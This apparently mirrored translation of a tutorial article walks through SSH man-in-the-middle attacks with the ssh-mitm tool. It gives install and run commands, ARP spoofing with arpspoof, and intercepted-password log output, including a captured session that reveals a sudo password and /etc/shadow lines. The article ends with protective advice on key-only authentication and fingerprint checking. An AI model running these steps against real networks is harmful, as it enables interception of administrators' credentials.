<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>How well are your SSH sessions secured?</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Performing daily tasks of the system administrator is considered safe when working through an SSH session. This article will discuss modern tools for ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>How well are your SSH sessions secured?</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/web/4c7/712/ef5/4c7712ef5cb748a092837cbc1014ef5d.jpg"><br><br>  Performing daily tasks of the system administrator is considered safe when working through an SSH session.  This article will discuss modern tools for conducting MITM attacks on the SSH protocol and how to protect against them. <br><a name="habracut"></a><br><h2>  Arsenal </h2><br>  <b>sshmitm</b> <br><br>  There is a tool that appeared quite a long time ago and is called - <b>sshmitm</b> .  It is included in the distribution kit for the Kali Linux pentest, but it supports only the first version of the SSH protocol, which in modern infrastructure imposes serious limitations. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <img src="https://habrastorage.org/web/59a/138/4cb/59a1384cb08e4d6289863108d0fbcde0.PNG"><br>  <b>mitmproxy</b> <br><br>  There is another tool that, in particular, allows you to conduct a MitM attack on the SSH protocol - mitmproxy (not to be confused with <a href="http://docs.mitmproxy.org/en/stable/">another mitmproxy</a> ).  It can be downloaded from <a href="https://github.com/saironiq/mitmproxy">github</a> .  This tool allows you to work with key authentication, but it did not work for me.  The tool is not supported for 4 years and does not work out of the box.  First you need to fix a few errors in the source code. <br><br>  After correcting errors, the tool allows you to conduct a MitM attack using password authentication. <br><br><img src="https://habrastorage.org/web/731/96b/cf8/73196bcf80534e0ea0d0e1005a1532c3.PNG"><br><br>  <b>intercepter-ng</b> <br><br>  It would be strange not to mention the <a href="http://sniff.su/">Intercepter-ng</a> tool, which allows, among other things, a classic MitM attack on the SSH protocol. <br><br><img src="https://habrastorage.org/web/a49/425/c56/a49425c567fe444f85423dbe4b57a539.PNG"><br><br>  <b>ssh-mitm</b> <br><br>  And just recently another tool appeared - ssh-mitm <br><br>  ‚Üí <a href="https://github.com/jtesta/ssh-mitm">GitHub</a> <br><br>  It is an OpenSSH v7.5p1 with a patch that allows you to work as a proxy between the SSH client and the original SSH server.  We will consider it in more detail. <br><br><h2>  Installation </h2><br>  Download the distribution in github and run the installation script <br><br><pre><code class="bash hljs">git <span class="hljs-built_in"><span class="hljs-built_in">clone</span></span> https://github.com/jtesta/ssh-mitm.git <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> ssh-mitm ./install.sh</code> </pre> <br>  The script will install all dependencies, download the openssh-7.5p1 sources, patch them, configure and compile them.  As a result, you will see a message. <br><br><pre> <code class="bash hljs">Done! The next step is to use JoesAwesomeSSHMITMVictimFinder.py to find target IPs, <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> execute run.sh and ARP spoof.</code> </pre> <br>  This will also create the / home / ssh-mitm directory. <br><br><h2>  Conducting attack </h2><br>  In order to conduct a MitM attack on the SSH protocol, we first need to redirect the victim's traffic to our machine, instead of the original SSH server.  After installing ssh-mitm, we can use the included script to search for ssh sessions on the network. <br><br>  The JoesAwesomeSSHMITMVictimFinder.py script is in the directory where you cloned the git repository and does the following: <br><br><ol><li>  Performs an arp-spoofing block of IP addresses (the block size is set by the parameter, the default is 5) </li><li>  Waits a few seconds (the waiting time is set by the parameter, the default is 20 seconds) </li><li>  Displays found SSH sessions in the console </li><li>  Move to the next block. </li></ol><br>  For arp-spoofing, ettercap is used, and for sniffing tshark network packets. <br>  Both tools are included by default in the Kali Linux distribution. <br><br>  When you run the script, you can get the message "The Python3 netaddr and / or netifaces module is not installed".  Corrected by running the command: <br><br><pre> <code class="bash hljs">apt install python3-netaddr python3-netifaces</code> </pre> <br>  An example of running the script: <br><br><pre> <code class="bash hljs">./JoesAwesomeSSHMITMVictimFinder.py --interface eth0 --listen-time 5</code> </pre><br>  Example output: <br><br><pre> <code class="bash hljs">Local servers: * 192.168.1.5 -&gt; 192.168.1.4:22</code> </pre> <br>  After the targets are determined, you need to run another script - run.sh, which is also located in the git directory. <br><br>  It actually starts the sshd_mitm service, sets the ip_forward system parameter to 1, thereby allowing transit packets and creates an iptables rule that redirects all packets to a fake SSH server. <br><br><pre> <code class="bash hljs">root@kalix64:~/mitm_and_spoof/ssh-mitm<span class="hljs-comment"><span class="hljs-comment"># iptables -t nat -L Chain PREROUTING (policy ACCEPT) target prot opt source destination REDIRECT tcp -- anywhere anywhere tcp dpt:ssh redir ports 2222 root@kalix64:~/mitm_and_spoof/ssh-mitm# netstat -tlpan Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:2222 0.0.0.0:* LISTEN 13241/sshd_mitm</span></span></code> </pre><br>  The run.sh script does not launch the arp-spoofing attack.  This must be done independently, for example, with the help of arpspoof or ettercap. <br><br><pre> <code class="bash hljs">arpspoof -i eth0 -t 192.168.1.4 -r 192.168.1.5</code> </pre><br>  To obtain the victim's credentials, it is convenient to view the auth.log file with tail. <br><br><pre> <code class="bash hljs">tail -f /var/<span class="hljs-built_in"><span class="hljs-built_in">log</span></span>/auth.log</code> </pre><br>  When the victim (192.168.1.5) tries to connect to the original SSH server (192.168.1.4), she will certainly see a message about changing the server‚Äôs public key <br><br><pre> <code class="bash hljs">ubuntu@gns3_1:~$ ssh ubuntu@192.168.1.4 The authenticity of host <span class="hljs-string"><span class="hljs-string">'192.168.1.4 (192.168.1.4)'</span></span> can<span class="hljs-string"><span class="hljs-string">'t be established. ED25519 key fingerprint is SHA256:kn+iT7WwgO6Wlh0xN4KQXB8P/JaHLcRx04gYTvNdjCM. Are you sure you want to continue connecting (yes/no)?</span></span></code> </pre> <br>  <b>UPD:</b> <s>In 99% of cases,</s> many administrators answer a similar question ‚Äúyes‚Äù. <br><br>  Next, the victim enters the username and password, and in the auth.log log on the machine of the attacker appears <br><br><pre> <code class="bash hljs">Aug 29 16:55:08 kalix64 sshd_mitm[13426]: INTERCEPTED PASSWORD: hostname: [192.168.1.4]; username: [ubuntu]; password: [qwerty123] [preauth] Aug 29 16:55:08 kalix64 sshd_mitm[13426]: Accepted password <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> ssh-mitm from 192.168.1.5 port 37838 ssh2</code> </pre><br>  And we see in / home / ssh-mitm the session_0.txt file with the recorded session: <br><br><pre> <code class="bash hljs">Last login: Tue Aug 29 16:46:03 2017 from ns.secret.lab ESC]0;ubuntu@ubuntu: ~^Gubuntu@ubuntu:~$ ccdd //eettcc ESC]0;ubuntu@ubuntu: /etc^Gubuntu@ubuntu:/etc$ ccaatt //eettcc//sshhaadd ^Gow^?^H^?^H^?^H^?^H^?^H^?^H^?^H^?^H^?^H^?^H^?^H^?^H^?^H^?^H^? ^H^?^G^?^G^?^G^?^G^?^G^?^G^?^G^?^G^?^G^?^G^?^Gssuuddoo ssuu -- [sudo] password <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> ubuntu: qwerty123 ESC]0;root@ubuntu: ~^Groot@ubuntu:~<span class="hljs-comment"><span class="hljs-comment"># ccdd //eettcc//^?^HESC[K ESC]0;root@ubuntu: /etc^Groot@ubuntu:/etc# ccaatt sshhaadd ^Gow ^G shadow shadow- ESC]0;root@ubuntu: /etc^Groot@ubuntu:/etc# cat shadow root:!:17040:0:99999:7::: daemon:*:17001:0:99999:7::: bin:*:17001:0:99999:7::: sys:*:17001:0:99999:7::: sync:*:17001:0:99999:7::: games:*:17001:0:99999:7::</span></span></code> </pre> <br>  As you can see, some data is backed up.  This is due to the fact that both user input and output to the screen are recorded.  The sudo program, for example, temporarily disables ‚Äúecho‚Äù and the password qwerty123 is displayed ‚Äúnormal‚Äù <br><br>  ssh-mitm, in my opinion, is a recorded session in a more convenient form than mitmproxy <br><br><img src="https://habrastorage.org/web/b74/bcb/98d/b74bcb98d95d4ef89d4f8c2012a33472.PNG"><br><br>  In the screenshot above, I tried to enter into the console <br><br><pre> <code class="bash hljs">cat /etc</code> </pre> <br>  If the target server does not allow password authentication, but only by key, ssh-mitm will still offer password authentication and simply break the connection after entering the credentials, since the original server will not accept the credentials.  But the attacker will get some kind of password and will be able to use it in the future, since the administrator is unlikely to enter something non-existent. <br><br><h2>  Protection </h2><br>  Strangely enough, but to protect against such attacks, nothing else needs to be installed in the system.  All that is needed is to disable password authentication with the directive. <br><br><pre> <code class="bash hljs">PasswordAuthentication no</code> </pre> <br>  And use key authentication. <br><br>  This will also protect the service from credential search attacks, i.e.  brute force <br><br>  Also, you should not accept the changed server fingerprint indiscriminately.  By itself, it usually does not change, and if you yourself are responsible for the server to which you are connecting and you know that you have not reinstalled anything, you should check once again whether there is no MitM attack currently being conducted. </div><p>Source: <a href="https://habr.com/ru/post/336726/">https://habr.com/ru/post/336726/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../336716/index.html">We sculpt a toolbar on PyQt, export data to Excel and HTML</a></li>
<li><a href="../336718/index.html">Interview with Herbert Lin (CISAC): ‚ÄúCyber ‚Äã‚Äãsecurity is an endless battle‚Äù</a></li>
<li><a href="../336720/index.html">How to lead introverts without harm to health</a></li>
<li><a href="../336722/index.html">Inside the super-fast CSS engine: Quantum CSS (aka Stylo)</a></li>
<li><a href="../336724/index.html">35-kilobyte post-nuclear caravan</a></li>
<li><a href="../336728/index.html">ARCore: Augmented Reality on Android</a></li>
<li><a href="../336730/index.html">Google Titan - New Chip Details Revealed</a></li>
<li><a href="../336732/index.html">Source Ripper and AST Spring Boot Tree</a></li>
<li><a href="../336738/index.html">CAA DNS record. Why do I need and how to use?</a></li>
<li><a href="../336740/index.html">Translation of Hans Buvald‚Äôs article ‚ÄúAction Based Testing‚Äù</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>